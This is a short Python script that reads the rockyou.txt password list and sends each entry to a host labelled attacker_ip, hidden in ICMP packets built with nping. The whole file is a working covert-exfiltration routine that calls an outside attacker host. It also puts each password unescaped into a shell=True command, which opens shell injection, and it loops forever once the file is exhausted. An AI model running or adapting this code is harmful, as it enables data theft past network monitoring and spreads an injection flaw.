import subprocess
import time

attacker_ip = '172.28.219.62'

with open('rockyou.txt') as r:
    while True:
        try:
            line = r.readline()

            password = line.strip()
            
            subprocess.Popen(f'nping --icmp -c 1 {attacker_ip} --data-string "{password}"', shell=True)
            print(f'sent {password}')
        except:
            print('utf8 password err')
        time.sleep(0.25)
    
        

